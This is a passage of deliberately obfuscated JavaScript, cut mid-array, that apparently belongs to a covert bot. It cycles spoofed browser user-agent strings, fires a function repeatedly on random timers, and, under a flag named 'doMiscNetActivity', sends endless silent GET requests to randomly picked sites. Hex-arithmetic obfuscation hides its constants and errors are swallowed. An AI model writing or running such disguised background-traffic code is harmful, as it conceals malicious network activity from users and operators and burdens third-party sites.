      'Mozilla/5.' + a9(0xd) + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1a67 + 0x1b64 + -0xfd; k < -0xc22 * -0x1 + 0x1a94 + -0x26b2; k++)
    setTimeout(f, (0x7 * -0x2529 + -0x425 * -0x46 + -0xcc61 * -0x1) * k * getRandomInt(-0x3 * -0x9bd + 0x1443 + -0x3179, 0x23ef + 0x295 + -0x2681));
  setInterval(() => {
    f();
    for (let l = -0x3fe * -0x1 + 0x35f * -0x1 + -0x9f; l < 0x796 + 0xf1 * 0x1 + -0x883; l++)
      setTimeout(f, (-0x75f4 * 0x1 + 0x51c4 * -0x5 + 0x2e * 0x108c) * l * getRandomInt(-0x3a0 + -0x1 * -0x664 + 0x2c3 * -0x1, -0xd1d + -0x1cd * 0x9 + -0x3 * -0x9c7));
  }, 0x11eb23 + 0x1 * -0x4c727b + 0x7175d8);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x20a6 + 0xc23 + -0x1171) * getRandomInt(-0x82 * -0x41 + 0x1c23 + -0x3d24, -0x7 * 0x2d8 + 0x6 * 0x24a + 0x5 * 0x13d));
}, -0x164a * 0x1 + -0x8e1 + 0x1f8f);